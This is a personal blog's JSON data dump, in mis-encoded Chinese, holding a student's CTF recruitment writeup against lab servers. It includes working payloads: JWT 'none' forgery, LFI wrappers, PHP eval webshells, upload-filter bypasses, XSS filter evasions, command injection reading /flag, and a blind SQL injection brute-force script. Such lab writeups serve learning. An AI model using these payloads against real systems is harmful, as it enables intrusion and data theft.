{"meta":{"title":"Leon's blogğŸ˜½","subtitle":"å†™äº›éšç¬”","description":"æƒ³çˆ±æƒ³åƒæƒ³å˜æˆå¤©ä¸Šå¿½æ˜å¿½æš—çš„äº‘","author":"Leon","url":"https://foreon.github.io","root":"/"},"pages":[{"title":"å…³äºæˆ‘","date":"2023-11-02T14:26:00.000Z","updated":"2023-11-02T14:38:28.527Z","comments":true,"path":"about/index.html","permalink":"https://foreon.github.io/about/index.html","excerpt":"","text":"ä»‹ç»ä¸‹è‡ªå·±æˆ‘æ˜¯UESTCç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šçš„ä¸€åæœ¬ç§‘ç”Ÿï¼Œç›®å‰åœ¨å­¦ä¹ ctfã€‚ä»¥åä¼šåœ¨è¿™ä¸ªåšå®¢æ›´æ–°ä¸€äº›è‡ªå·±çš„å­¦ä¹ ç»å†å’Œæ€»ç»“ï¼Œå¯èƒ½ä¹Ÿä¼šå­˜ä¸€äº›æœŸæœ«å¤ä¹ ç¬”è®°ï¼ˆ å¸Œæœ›èƒ½ä¿æŒä¸€é¢—ä¸æ–­å­¦ä¹ çš„å¿ƒğŸ™ğŸ™ğŸ™"},{"title":"å‹é“¾","date":"2023-11-02T13:04:17.000Z","updated":"2023-11-02T13:52:42.568Z","comments":true,"path":"link/index.html","permalink":"https://foreon.github.io/link/index.html","excerpt":"","text":""},{"title":"ç›¸å†Œ","date":"2023-11-02T13:43:04.000Z","updated":"2023-11-02T14:38:56.014Z","comments":true,"path":"gallery/index.html","permalink":"https://foreon.github.io/gallery/index.html","excerpt":"","text":"æ–½å·¥ä¸­ã€‚ã€‚ã€‚"},{"title":"categories","date":"2023-11-02T13:02:49.000Z","updated":"2023-11-02T13:02:49.852Z","comments":true,"path":"categories/index-1.html","permalink":"https://foreon.github.io/categories/index-1.html","excerpt":"","text":""},{"title":"ç•™è¨€æ¿","date":"2023-11-02T13:04:09.000Z","updated":"2023-11-02T14:39:07.233Z","comments":true,"path":"messageboard/index.html","permalink":"https://foreon.github.io/messageboard/index.html","excerpt":"","text":"æ–½å·¥ä¸­ã€‚ã€‚ã€‚"},{"title":"åˆ†ç±»","date":"2023-11-02T05:06:39.000Z","updated":"2023-11-02T13:17:35.207Z","comments":true,"path":"categories/index.html","permalink":"https://foreon.github.io/categories/index.html","excerpt":"","text":""},{"title":"æ—¥å¿—","date":"2023-11-02T13:06:13.000Z","updated":"2023-11-02T13:07:24.429Z","comments":true,"path":"timeline/index.html","permalink":"https://foreon.github.io/timeline/index.html","excerpt":"","text":""},{"title":"Leon","date":"2023-11-02T13:07:38.000Z","updated":"2023-11-02T13:08:01.344Z","comments":true,"path":"myself/index.html","permalink":"https://foreon.github.io/myself/index.html","excerpt":"","text":""},{"title":"éŸ³ä¹","date":"2023-11-02T14:22:10.000Z","updated":"2023-11-02T14:39:24.010Z","comments":true,"path":"music/index.html","permalink":"https://foreon.github.io/music/index.html","excerpt":"","text":"æ–½å·¥ä¸­ã€‚ã€‚ã€‚"},{"title":"æ ‡ç­¾","date":"2023-11-02T05:07:08.000Z","updated":"2023-11-02T12:35:58.799Z","comments":true,"path":"tags/index.html","permalink":"https://foreon.github.io/tags/index.html","excerpt":"","text":""},{"title":"å½±è§†","date":"2023-11-02T14:22:29.000Z","updated":"2023-11-02T14:39:16.375Z","comments":true,"path":"movies/index.html","permalink":"https://foreon.github.io/movies/index.html","excerpt":"","text":"æ–½å·¥ä¸­ã€‚ã€‚ã€‚"},{"title":"tags","date":"2023-11-02T12:35:20.000Z","updated":"2023-11-02T12:35:20.326Z","comments":true,"path":"tags/index-1.html","permalink":"https://foreon.github.io/tags/index-1.html","excerpt":"","text":""}],"posts":[{"title":"YuLin 2023 Recruit Writeup","slug":"YuLin 2023 Recruit Writeup","date":"2023-11-03T15:56:39.000Z","updated":"2023-11-03T16:15:39.789Z","comments":true,"path":"posts/36124.html","link":"","permalink":"https://foreon.github.io/posts/36124.html","excerpt":"","text":"YuLin 2023 Recruit Writeupå‰è¨€ï¼ˆå ä¸ªç”²å…ˆpart1æ˜¯ç”¨wordå†™çš„ï¼Œç›´æ¥é»è´´è¿‡æ¥é‡å¤ªå¤šå°±ä¸ä¿®æ”¹äº†ğŸ˜­ï¼Œpart2 æ˜¯ç”¨mdï¼Œå¯èƒ½çœ‹èµ·æ¥èˆ’æœä¸€ç‚¹ã€‚å¦‚æœè¯»è€…çœ‹å¾—æ¯”è¾ƒéš¾å—ï¼Œè¿™éå¸¸æ­£å¸¸ï¼Œè¯·åŸè°…æˆ‘çš„æ‡’æƒ°ğŸ™‡part1:Tutorial1.httpè¿™é‡Œè¦æ³¨æ„ï¼Œadminæ˜¯æ”¹cookieé‡Œçš„admin&#x3D;1! 2.302è·³è½¬ æŸ¥çœ‹æºä»£ç æ‰¾åˆ°&#x2F;302.php Curl -i æ‰¾åˆ°flag 3.encode å…³äºdecodeå¯ä»¥çœ‹çœ‹è¿™ä¸ªé“¾æ¥ https://www.cnblogs.com/ruoli-s/p/14206145.html åˆ¤æ–­ç¬¬ä¸€ä¸ªæ˜¯md5 è§£å¯†å¾—åˆ°Yulin åˆ¤æ–­ç¬¬äºŒä¸ªæ˜¯hexç¼–ç  è§£ç å¾—åˆ°Sec{we_mu5t_kn0w ç¬¬ä¸‰ä¸ªæ˜¯base64 è§£ç å¾—åˆ°_c0mm0n åˆ¤æ–­ç¬¬å››ä¸ªæ˜¯htmlå®ä½“ç¼–ç  è§£ç å¾—åˆ°_enc0d1ngs} ç»„åˆä¸€ä¸‹å¾—åˆ°flag YulinSec{we_mu5t_kn0w_c0mm0n _enc0d1ngs} 4.Method è¢«æç¤ºæœ‰å¾ˆå¤šhttpmethod æ‹¿postmanä¸€ä¸ªä¸ªè¯•å°±è¯•å‡ºæ¥äº† 5.cal-1 æºä»£ç è¿›å»æ”¹ä¸‹é•¿åº¦å°±å®Œäº‹ 6.cal-2 å‘ç°è¦ç”¨postçš„æ–¹æ³•ä¼ æ•°æ®ï¼Œå°±å®Œäº‹äº† 7.cal-3 ç”¨pythonè„šæœ¬åš æˆ‘è¿˜å­¦äº†å¥½ä¸€ä¼šï¼Œæ„Ÿè§‰pythonè„šæœ¬æ˜¯ä¸ªå¤§é—®é¢˜ import requestss&#x3D;requests.Session()url&#x3D;â€™http://43.142.109.233:44504/index.phpâ€˜r&#x3D;s.get(url) res&#x3D;r.text a&#x3D;res.find(â€œâ€œ)b&#x3D;res.find(â€œ&#x2F;p&gt;â€,a)#æ‰¾åˆ°æˆ‘ä»¬è¦è®¡ç®—çš„å¼å­çš„å‰åä½ç½®num&#x3D;res[a+3:b-1]print(a)print(b)print(num)r&#x3D;s.post(url,data&#x3D;{â€˜resultâ€™:eval(num)})print(r.content) 8.https å‰è¨€: ç»å¤§ä½¬æé†’,äº†è§£äº†ä¸å°‘jwtçŸ¥è¯† äº†è§£åˆ°ä¸¤ç§ä¸»è¦æ€è·¯ 1.å¼±å£ä»¤æŠŠkeyçˆ†å‡ºæ¥ 2.ä½¿ç”¨noneçš„æ–¹å¼ ç”±äºå®‰è£…ä¸æ¸…æ¥šç¬¬ä¸€æ¬¡æ‰€éœ€çš„å·¥å…·ğŸ˜…ï¼Œæ‰€ä»¥é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³• åŸç†å¦‚ä¸‹æ‰€ç¤º æœ¬é¢˜æŠ“åŒ…å‘ç°token,äºæ˜¯é‡‡ç”¨jwtç»•è¿‡ 1.å°†å¤´éƒ¨ä¿¡æ¯çš„algå€¼æ”¹ä¸ºnoneï¼Œå¹¶è¿›è¡Œbase64åŠ å¯† 2.å°†å£°æ˜éƒ¨åˆ†çš„adminå€¼æ”¹ä¸ºtrueï¼Œä¹Ÿè¿›è¡Œbase64åŠ å¯† 3.æ–°ç»„åˆçš„JWTåº”è¯¥ä¸ºå¤´éƒ¨``.``å£°æ˜``.(å› ä¸ºå¤´éƒ¨ä¸­çš„åŠ å¯†æ–¹å¼ä¸ºnoneï¼Œæ‰€ä»¥ç­¾åéƒ¨åˆ†å¯ä»¥èˆå»)ï¼Œä½†åˆç”±äº&#x3D;å·ä¼šä¸urlè§£ç äº§ç”Ÿæ­§ä¹‰ï¼Œæ‰€ä»¥éœ€è¦å°†&#x3D;å·åˆ é™¤ï¼Œè€ŒBase64URLæ˜¯æ”¯æŒè¿™ç§å†™æ³•çš„ æœ€ç»ˆçš„JWTå€¼ä¸ºewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJhZG1pbiI6ICIxIiwKICAiaWF0IjogMTY5NDk0OTM0NSwKICAiZXhwIjogMTY5NDk1NjU0NSwKICAianRpIjogIjM0YTczNGEzODAzZGY1NmZlYmIzOTg3MzJlOWQwZDE5Igp9. 4.æŠŠtokenæ”¾åˆ°cookieé‡Œå¾—åˆ°flag LFI ä¾ç…§æç¤ºä¼ å‚å³å¯ ä¸çŸ¥é“ä¸ºå•¥hackbarçš„postè¿™ç±»é¢˜ç”¨ä¸äº†ï¼Ÿ é‚£å°±ç”¨postmanæ¥post ä½¿ç”¨file&#x3D;php:&#x2F;&#x2F;input + post å†file&#x3D;php:&#x2F;&#x2F;input + post å¾—åˆ°flag ä½¿ç”¨data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; data:&#x2F;&#x2F;text&#x2F;plain, data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D; å¾—åˆ°flag çœ‹åˆ°æç¤ºï¼Œç›´æ¥æƒ³åˆ°ç”¨base64ç¼–ç è½¬å‡º file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php å¾—åˆ°ä¸€ä¸²base64ç¼–ç ï¼Œè½¬ç ä¹‹åå³å¾—åˆ°flag çœ‹æ•™ç¨‹ç»•è¿‡file_get_contents($file) äº†ä½†æ˜¯è¿˜å¯¹åŸç†ä¸€çŸ¥åŠè§£ é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼å°±æ‹¿åˆ°flagäº† æ–‡æ¡£é‡Œè¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œè¯è¯´æˆ‘è‡ªå·±è¯•çš„ä¸€å¥è¯æœ¨é©¬å°±ä¸å¤ªå¥½ä½¿ï¼Œè¿˜å¾—æ˜¯å›¾ç‰‡é‡Œçš„è¿™ä¸ªå¥½ä½¿ï¼Œç„¶åå°±ç”Ÿæˆä¸€å¥è¯æœ¨é©¬å›¾ç‰‡å‘—ï¼Œç„¶åèšå‰‘ &lt;?phpfputs(fopen(â€œshell.phpâ€,&#39;w&#39;),&#39;&lt;?php @eval($_POST[â€leonâ€œ])ï¼›?&gt; &#39;); ?&gt; è¦æ³¨æ„çš„æ˜¯èšå‰‘è®¿é—®çš„ç›®å½•æ˜¯ç”Ÿæˆçš„shell.php å³ä¸ºhttp://43.142.109.233:21005/shell.php è¿™é¢˜èŠ±äº†æˆ‘å¤§æ¦‚ä¸€å¤©çš„æ—¶é—´é’»ç ”ï¼Œæœ€ç»ˆåšå‡ºæ¥äº† å‚è€ƒï¼šLFI ç»•è¿‡ Session åŒ…å«é™åˆ¶ Getshell_é€šè¿‡sessidè¿›è¡Œæ–‡ä»¶å†™å³å¯,ä½¿ç”¨ file:&#x2F;&#x2F;localhost&#x2F; è¿›è¡Œç»•è¿‡_zhangä¸‰çš„åšå®¢-CSDNåšå®¢ å…ˆäº†è§£sessionçŸ¥è¯†å§ Phpinfoå…ˆæ‰¾åˆ°sessionçš„å‚¨å­˜è·¯å¾„ Sessionè‡ªå®šä¹‰ä¸€ä¸ª ç„¶åä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ å‘ç°å¯ä»¥æ§åˆ¶äº† äºæ˜¯æœæ–­èšå‰‘è§£å‡º è¡¥ä¸€ä¸ªå¤§ä½¬çš„åšæ³•ï¼š æ€è·¯æ›´æ¸…æ™°ä¸€äº› XSS çœ‹çœ‹è¿™è¿™ç¯‡æ”»ç•¥XSSæŒ‘æˆ˜èµ›è§£é¢˜æ€è·¯_å¤šå´å·¡ç¤¼çš„åšå®¢-CSDNåšå®¢ çœ‹æºä»£ç å‘ç°æœ‰ä¸ªhiddençš„ name æ™®æ™®é€šé€šæ„é€ ä¸ªplayloadå°±å®Œäº‹äº† name=&lt;script&gt;alert(1)&lt;/script&gt; è¿™é‡Œæˆ‘æœ¬æ¥æƒ³ç”¨é—­åˆæ ‡ç­¾æ¥å®Œæˆ ä½†æ˜¯å‘ç°&lt;è¢«è½¬ä¹‰äº†ï¼Œåªèƒ½åˆ©ç”¨ &#39;onmouseover=alert(1)//ï¼Œä¸è¿‡è¿™é‡Œéœ€è¦ç”¨å•å¼•å·é—­åˆï¼Œæ„é€ playload å’Œä¸Šé¢˜ä¸€æ ·ï¼Œåªä¸è¿‡æŠŠå•å¼•å·æ¢æˆåŒå¼•å·æ¥é—­åˆç½¢äº† ç¬¬å››é¢˜å‘ç°ä¼šæŠŠonè½¬æˆo_n è€Œä¸”ä¼šç»™ ä¸­é—´çš„ä¸œè¥¿åŠ åŒå¼•å· äºæ˜¯ä¸Šç½‘æŸ¥æ”»ç•¥,çŸ¥é“è¦ç”¨ä¼ªåè®® &quot;&gt;&lt;iframe src=javascript:alert(1)&gt; &quot;&gt;&lt;a href=javascript:alert(1)&gt; &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;zhouzhong&lt;/a&gt; &quot;&gt;&lt;a href=&quot;javascript:%61lert(1)&quot;&gt;zhouzhong&lt;/a&gt; // å°±åšå‡ºæ¥äº† 5. è¯•äº†è¯•â€&gt;1&lt;script&gt;alert(1)&lt;/script&gt; // å¯èƒ½æ˜¯å±è”½äº†script,äºæ˜¯æ€è·¯æ˜¯åŒå†™ç»•è¿‡ &quot;&gt;&lt;scriscriptpt&gt;alert(0)&lt;/scriscriptpt&gt;//è¿™äº›åŒå†™ä¹Ÿå¯ä»¥ å°±æ‹¿åˆ°flagäº† ç”¨ä¼ªåè®®å‘ç°è¿‡æ»¤äº†javascriptï¼Œäºæ˜¯æŸ¥æ”»ç•¥å§ javascrip&amp;#x74;:alert(1) javasc&amp;#x72;ipt:alert1 javasc&amp;#x0072;ipt:alert1 ç¬¬ä¸€æ¬¡è§è¿™ç§ï¼ŒçŒœæµ‹t_sorté‚£é‡Œæ˜¯éšè—çš„æœç´¢æ¡† äºæ˜¯çœ‹æ”»ç•¥å§ è¿™é‡Œåªè¦æ„é€ å¦‚ä¸‹playloadå°±è¡Œ t_sort=â€type=â€™â€™textâ€onclick = â€alert(1) å¤ç°äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªåŒå¼•å·â€ä¸èƒ½ç”¨ å¾—ç”¨ä¸‹é¢çš„åŒå¼•å· â€œ æœªè§£ä¹‹è°œï¼Œå…ˆæ”¾è¿™å§ t_sort=&quot;type=&quot;text&quot;onclick = &quot;alert(1) XSSçœ‹æ”»ç•¥æ„‰å¿«çš„akäº† è¯è¯´çœŸçš„ä¸æ˜¯æŒ‰è¿™ä¸ªæ”»ç•¥å‡ºé¢˜çš„å—( RCE åœ¨å½“å‰ç›®å½•ä¸‹æ²¡æ‰¾ï¼Œäºæ˜¯ ls &#x2F; ping127.0.0.1;ls &#x2F; # æ‰¾åˆ°flag ping127.0.0.1;cat &#x2F;flag_3124131231 # ping127.0.0.1;ls # æœ‰waf è¯•äº†ä¸€ä¸‹è¿‡æ»¤äº†;|&amp;â€™&#96;ç­‰ç­‰ äºæ˜¯ç”¨%0a``ç»•è¿‡ ip=127.0.0.1%0als / å†ip&#x3D;127.0.0.1%0acat&#x2F;flag_31241421414 å¾—åˆ°flag è¯•äº†ä¸€ä¸‹è¿‡æ»¤äº†ls æ–‡ä»¶ä¸Šä¼  é‡‡ç”¨äº†ä¸€ç§æ–°çš„æ–¹å¼ ä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶èšå‰‘åé—¨æŠ¥é”™æ äºæ˜¯ç«ç‹ç¦æ­¢jsï¼Œä¼ ä¸€ä¸ª.phpæ–‡ä»¶ä¸Šå» è·¯å¾„æ˜¯å¤åˆ¶çš„å›¾åƒé“¾æ¥ ç„¶åèšå‰‘åé—¨ è€ƒå¯Ÿ.htaccessæ–‡ä»¶ ç”¨è®°äº‹æœ¬å†™è¿™æ ·ä¸€ä¸ªåä¸º.htaccessçš„æ–‡ä»¶ æ³¨æ„ä¿å­˜ä¸ºæ‰€æœ‰ç±»å‹ &lt;FilesMatchâ€œ.pngâ€&gt; SetHandler application&#x2F;x-httpd-php è¯¥æ–‡ä»¶çš„æ„æ€æ˜¯ï¼Œåªè¦é‡åˆ°æ–‡ä»¶åä¸­åŒ…å«æœ‰â€.pngâ€å­—ç¬¦ ä¸²çš„ï¼Œç»Ÿä¸€æŒ‰ç…§ php æ–‡ä»¶æ¥æ‰§è¡Œã€‚ç„¶åå°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå¸¦ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶ï¼Œä¾‹å¦‚a_php.gifï¼Œä¼š è¢«å½“æˆphpæ‰§è¡Œã€‚è¯¥æ–¹æ³•å…¶å®ä¸æ˜¯æ¼æ´ï¼Œæ˜¯Apacheçš„ç‰¹æ€§ã€‚è¯¥æ–¹æ³•å¸¸ç”¨äºé»‘å®¢å…¥ä¾µç½‘ç«™ä¹‹åï¼Œä¸æƒ³ è¢«å‘ç°ï¼Œç•™ä¸€ä¸ªéšè”½çš„åé—¨ã€‚ ç„¶åå…ˆä¸Šä¼ .htaccessæ–‡ä»¶,å†ä¸Šæ¬¡æœ¨é©¬.png ç„¶åèšå‰‘å°±å®Œäº‹äº† ä¸Šä¼ phpæ–‡ä»¶æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºimage&#x2F;png ç„¶åå°±å¯ä»¥ä¸Šä¼ äº†ï¼Œäºæ˜¯æ„‰å¿«çš„èšå‰‘ è€ƒå¯Ÿæ–‡ä»¶å¤´ç»•è¿‡ ç”¨winhex ä½†æ˜¯è¿™æ ·ä¿®æ”¹åç”¨èšå‰‘è¿æ¥ http://43.142.109.233:30004/upload/muma.png è¿˜æ˜¯æŠ¥é”™ï¼Œäºæ˜¯å†æ¬¡é‡‡ç”¨ä¸Šä¼ phpç”¨burpæ”¹pngçš„æ–¹æ³• å…¶å®ä¹Ÿå¯ä»¥æ¢ä¸€ç§ç”Ÿæˆshell.phpçš„pngå›¾ç‰‡æœ¨é©¬ ä¸‹æ¬¡å†è¯• ç„¶åèšå‰‘å§ å¾ˆæ˜æ˜¾è¦ç»•è¿‡é»‘åå•è¿™äº› ä½†æ˜¯æ˜æ˜¾é»‘åå•å¤ªå°‘äº†ï¼Œè¿™é‡Œå…ˆç”¨å¤§å†™ç»•è¿‡ç½¢ ç„¶è€Œå¤§å†™ç»•è¿‡å¹¶ä¸å¯è¡Œï¼Ÿ å†æ¬¡å°è¯•åŒå†™ç»•è¿‡ï¼Œæˆäº†ï¼Œäºæ˜¯èšå‰‘ å†æ¬¡å°è¯•åŒå†™ å‘ç°ä¸è¡Œï¼Œæ·»åŠ äº†ä¸€ä¸ªç©ºæ ¼ è¿™æ¬¡å¤§å†™ç»•è¿‡åˆè¡Œäº†ï¼Ÿ é‚£å°±èšå‰‘å§ æç¤º%00æˆªæ–­ åŸç†å¦‚ä¸‹ ç…§çŒ«ç”»è™å°±å‡ºæ¥äº† è€ƒå¯Ÿ16è¿›åˆ¶00æˆªæ–­ Burpä¸Šä¼ å›¾ç‰‡æœ¨é©¬æŠ“åŒ… åœ¨è·¯å¾„åé¢åŠ ä¸€ä¸ª1.php+,å†åœ¨hexé‡Œæ‰¾åˆ°+å¯¹åº”çš„ç¼–ç ï¼Œå¹¶æ”¹æˆ00,å°±è·Ÿä¸Šé¢˜ä¸€æ ·äº† æç¤ºç™½åå•ï¼Œä½†æ˜¯è¯•ä¸€ä¸‹åˆè§‰å¾—æ˜¯é»‘åå•ï¼Ÿ åŒå†™å¤§å†™ç»•è¿‡éƒ½æ²¡ç”¨ï¼Œé‚£è¯•è¯•åˆ«çš„å§ è«åå¥‡å¦™åšå‡ºæ¥äº†ï¼Ÿ æ”¹æˆè¿™æ · æ³¨æ„èšå‰‘è¿æ¥phtmlè¿˜æ˜¯å°å¿ƒ(ä¸ºä»€ä¹ˆ è¿™é¢˜è¦å†åšä¸€é ä¸ºä»€ä¹ˆè¿™é‡Œå¤šäº†ä¸ªç©ºæ ¼ï¼Œæ€ä¹ˆå¤ç°ï¼Ÿ å†åšäº†ä¸€æ¬¡ä¸ºä»€ä¹ˆåˆæ²¡ç©ºæ ¼äº†ï¼Œè€Œä¸”è¿™é‡Œè·¯å¾„ä¸ºä»€ä¹ˆä¸éœ€è¦å¤§å†™ï¼Ÿ 11.äºŒæ¬¡æ¸²æŸ“ åˆæˆä¸€ä¸ªgifæœ¨é©¬æ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶å¤´è¦å¯¹ è¿˜æ˜¯ä¸è¡Œï¼Ÿé‚£è¿˜æ˜¯æ‰¾ä¸€å¼ çœŸæ­£çš„gifåˆæˆå§ ç°åœ¨è¡Œäº† ä¸‹è½½gifï¼Œæ¯”å¯¹æ²¡æœ‰æ”¹å˜çš„åœ°æ–¹ ç„¶ååœ¨ä¸æ”¹å˜çš„åœ°æ–¹æ’å…¥ä¸€å¥è¯æœ¨é©¬ èšå‰‘è¿å›¾ç‰‡é“¾æ¥è€æŠ¥é”™ å»å­¦äº†ä¸€ä¸‹ å…¶å®ç”¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´å°±èƒ½ç”¨èšå‰‘è¿æ¥ è¦åˆ©ç”¨include.php?file&#x3D;upload&#x2F; ç„¶åå°±å¯ä»¥ç”¨èšå‰‘è¿æ¥äº† ç½‘é¡µä¹Ÿæ˜¯å¯ä»¥è®¿é—®çš„ æç¤ºæ˜¯åˆ©ç”¨move_uploaded_file($temp_file,$img_path)çš„æ¼æ´ï¼Œè¿™ä¸ªå‡½æ•°å®ƒæœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¿½ç•¥åˆ°æ–‡ä»¶æœ«å°¾çš„&#x2F;. è¿™æ ·ä¸Šä¼ ï¼Œç„¶åburpæŠ“åŒ… æŠŠåå­—æ”¹æˆmuma.php&#x2F;. èšå‰‘è¿æ¥ &#x2F;upload&#x2F;muma.phpå‘ç°å¯ä»¥è®¿é—®äº† é¡ºè—¤æ‘¸ç“œæ‰¾åˆ°äº†åŸå¸–ï¼ˆæœç´¢èƒ½åŠ›ä¹Ÿæ˜¯èƒ½åŠ›ï¼ ç›´æ¥çœ‹åŸå¸–å§ï¼Œå“¥ä»¬ä»£ç å®¡è®¡è¿˜çœ‹ä¸æ˜ç™½ Sqlæ³¨å…¥ 1.æ™®é€šæ³¨å…¥ æ™®æ™®é€šé€šçš„æ•´å½¢é—­åˆ å¦‚å›¾æ‰€ç¤ºåšå®Œ æç¤ºæ˜¯æŠ¥é”™æ³¨å…¥ è¯•äº†ä¸€ä¸‹æ˜¯æ•´å½¢é—­åˆæ ä»¥ä¸‹é»è´´ä¹‹åçš„ä»£ç æœ‰é—®é¢˜ çˆ†æ•°æ®åº“ http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(â€˜~â€™, substr( (select group_concat(schema_name) from information_schema.schemata) , 1 , 31) ),3)â€“ a çˆ†è¡¨å http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(â€˜~â€™, substr( (select group_concat(table_name) from information_schema.tables wheretable_schema&#x3D;database()) , 8 , 31) ),3)â€“ a æ³¨æ„è¿™é‡Œè¦å–åé¢çš„å­—ç¬¦æ‰å®Œæ•´ çˆ†åˆ—å http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(â€˜~â€™, substr( (select group_concat(column_name) from information_schema.columns wheretable_name&#x3D;â€™flagâ€™) , 1 , 31) ),3)â€“ a çˆ†flag http://43.142.109.233:20002/?id=-1 and updatexml(1,concat(â€˜~â€™, substr( (select group_concat(flag) from flag) , 10 , 31) ),3)â€“ a æ³¨æ„flagå¤ªé•¿æ˜¾ç¤ºä¸å®Œå…¨ï¼Œåˆ†æ®µæ¥çœ‹å§ å¸ƒå°”ç›²æ³¨ ä¸€äº›åŸºç¡€çŸ¥è¯† æ“ä½œ å¼€æ è¯•äº†ä¸€ä¸‹å‘ç°æ˜¯æ•´å½¢å½¢é—­åˆ http://43.142.109.233:20003/?id=1and length(database())&#x3D;8 å°è¯•åˆ°8å‘ç°å›æ˜¾ok,è¯´æ˜æ•°æ®åº“åä¸º8 ä¸€ä¸ªä¸ªæŠŠæ•°æ®åè¯•å‡ºæ¥ æ¨èäºŒåˆ†æŸ¥æ‰¾æ³• http://43.142.109.233:20003/?id=1and ASCII(SUBSTR(database(),2,1)) &#x3D; 101 okæŸ¥å‡ºæ¥æ˜¯security å‘ç°æä¸å®šå•Š,è¿™å·¥ç¨‹é‡ã€‚ã€‚ã€‚è¿˜å¾—ä¸Šè„šæœ¬ import requests åªéœ€è¦ä¿®æ”¹url å’Œ ä¸¤ä¸ªpayloadå³å¯ç›®æ ‡ç½‘å€ï¼ˆä¸å¸¦å‚æ•°ï¼‰url &#x3D; â€œhttp://43.142.109.233:20003/â€œ çŒœè§£é•¿åº¦ä½¿ç”¨çš„payloadpayload_len &#x3D; â€œâ€â€?id&#x3D;1 and length( (database()) ) &lt; {n} â€œâ€â€ æšä¸¾å­—ç¬¦ä½¿ç”¨çš„payloadpayload_str &#x3D; â€œâ€â€?id&#x3D;1 and ascii( substr( (database()) ,{n},1) ) &#x3D; {r} â€œâ€â€ è·å–é•¿åº¦def getLength(url, payload): length &#x3D; 1 # åˆå§‹æµ‹è¯•é•¿åº¦ä¸º1 while True: response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length)) # é¡µé¢ä¸­å‡ºç°æ­¤å†…å®¹åˆ™è¡¨ç¤ºæˆåŠŸ if â€˜OKâ€™ in response.text: print(â€˜æµ‹è¯•é•¿åº¦å®Œæˆï¼Œé•¿åº¦ä¸ºï¼šâ€™, length,) return length; else: print(â€˜æ­£åœ¨æµ‹è¯•é•¿åº¦ï¼šâ€™,length) length +&#x3D; 1 # æµ‹è¯•é•¿åº¦é€’å¢ è·å–å­—ç¬¦def getStr(url, payload, length): str &#x3D; â€˜â€™ # åˆå§‹è¡¨å&#x2F;åº“åä¸ºç©º # ç¬¬ä¸€å±‚å¾ªç¯ï¼Œæˆªå–æ¯ä¸€ä¸ªå­—ç¬¦ for l in range(1, length+1): # ç¬¬äºŒå±‚å¾ªç¯ï¼Œæšä¸¾æˆªå–å­—ç¬¦çš„æ¯ä¸€ç§å¯èƒ½æ€§ for n in range(33, 126): response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n)) # é¡µé¢ä¸­å‡ºç°æ­¤å†…å®¹åˆ™è¡¨ç¤ºæˆåŠŸ if â€˜OKâ€™ in response.text: str+&#x3D; chr(n) print(â€˜ç¬¬â€™, l, â€˜ä¸ªå­—ç¬¦çŒœè§£æˆåŠŸï¼šâ€™, str) break; return str; å¼€å§‹çŒœè§£length &#x3D; getLength(url, payload_len)getStr(url, payload_str, length) æ¯æ¬¡è¦æ”¹çš„åœ°æ–¹åªæœ‰æ ‡çº¢çš„åŒºåŸŸ database() çˆ†å‡ºæ¥è¡¨åä¸ºsecurity è¿™é‡Œå…ˆæ‰‹åŠ¨å¯¹å½“å‰æ•°æ®åº“çˆ†è¡¨çš„æ•°é‡ï¼Œå¾ˆæ–¹ä¾¿ http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.tables wheretable_schema&#x3D;database())&#x3D;5 çˆ†å‡ºæ¥æ˜¯5 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit0,1 ç¬¬ä¸€ä¸ªè¡¨ referers selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 selecttable_name from information_schema.tables where table_schema &#x3D; database() limit 1,1 åªæ”¹limitåé¢çš„æ•°å°±å®Œäº‹ ç¬¬äºŒä¸ªè¡¨ emails ä»¥æ­¤æ¨ç±» ç¬¬ä¸‰ä¸ªè¡¨users ç¬¬å››ä¸ªè¡¨flag ç¬¬äº”ä¸ªè¡¨ å°±ä¸æŸ¥äº† 4.æ‰‹åŠ¨çˆ†ä¸€äº›usersçš„åˆ—æ•°é‡ http://43.142.109.233:20003/?id=1and (select COUNT(*) from information_schema.columns wheretable_schema&#x3D;database() and table_name&#x3D;â€usersâ€)&#x3D;3 çˆ†å‡ºæ¥æ˜¯3 æ³¨æ„è¿™é‡Œè¦ç”¨åŒå¼•å·ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ã€‚ã€‚ selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name &#x3D;â€usersâ€ limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;â€usersâ€ limit 0,1 selectcolumn_name from information_schema.columns where table_schema &#x3D; database() andtable_name&#x3D;â€usersâ€ limit 0,1 æµ‹å‡ºuersç¬¬ä¸€åˆ—:id æµ‹å‡ºuersç¬¬ä¸‰åˆ—: æµ‹å‡ºuersç¬¬ä¸‰åˆ—:password ä¸æµ‹äº†ï¼Œæ‰å‘ç°å‰é¢æé”™äº† 